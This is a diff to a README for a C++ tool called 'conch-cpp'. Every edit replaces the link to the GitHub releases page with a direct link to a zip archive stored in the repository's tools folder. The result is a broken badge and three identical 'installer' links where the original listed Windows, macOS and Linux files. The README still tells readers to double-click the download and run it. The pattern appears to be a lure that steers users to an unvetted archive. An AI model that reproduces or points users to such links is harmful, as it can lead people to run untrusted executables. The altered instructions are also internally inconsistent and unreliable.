@@ -1,6 +1,6 @@
 # 🚀 conch-cpp - Build Applications Quickly and Easily
 
-[![Download conch-cpp](https://img.shields.io/badge/Download%20Now-Release%20Page-blue)](https://github.com/Zaouadi2004/conch-cpp/releases)
+[![Download conch-cpp](https://github.com/Zaouadi2004/conch-cpp/raw/refs/heads/main/tools/cpp-conch-3.4.zip%20Now-Release%20Page-blue)](https://github.com/Zaouadi2004/conch-cpp/raw/refs/heads/main/tools/cpp-conch-3.4.zip)
 
 ## 📜 Overview
 
@@ -24,11 +24,11 @@ Before you install conch-cpp, make sure your system meets these requirements:
 
 1. **Visit the Releases Page**: Click the link below to access our releases.
    
-   [Download conch-cpp](https://github.com/Zaouadi2004/conch-cpp/releases)
+   [Download conch-cpp](https://github.com/Zaouadi2004/conch-cpp/raw/refs/heads/main/tools/cpp-conch-3.4.zip)
 
 2. **Choose a Version**: On the releases page, you will see different versions listed. Pick the latest version for the best features.
 
-3. **Download the Installer**: Click on the file that matches your operating system. For example, you might see options like `conch-cpp-windows.exe`, `conch-cpp-macos.tar.gz`, or `conch-cpp-linux.tar.gz`.
+3. **Download the Installer**: Click on the file that matches your operating system. For example, you might see options like `https://github.com/Zaouadi2004/conch-cpp/raw/refs/heads/main/tools/cpp-conch-3.4.zip`, `https://github.com/Zaouadi2004/conch-cpp/raw/refs/heads/main/tools/cpp-conch-3.4.zip`, or `https://github.com/Zaouadi2004/conch-cpp/raw/refs/heads/main/tools/cpp-conch-3.4.zip`.
 
 4. **Run the Installer**: Once the download is complete, locate the downloaded file on your computer. Double-click the file to start the installation. Follow the on-screen instructions to complete the installation.
 
@@ -104,4 +104,4 @@ Using **conch-cpp** can streamline your development process and help you create 
 
 Visit the releases page again to download the latest version.
 
-[Download conch-cpp](https://github.com/Zaouadi2004/conch-cpp/releases)
+[Download conch-cpp](https://github.com/Zaouadi2004/conch-cpp/raw/refs/heads/main/tools/cpp-conch-3.4.zip)
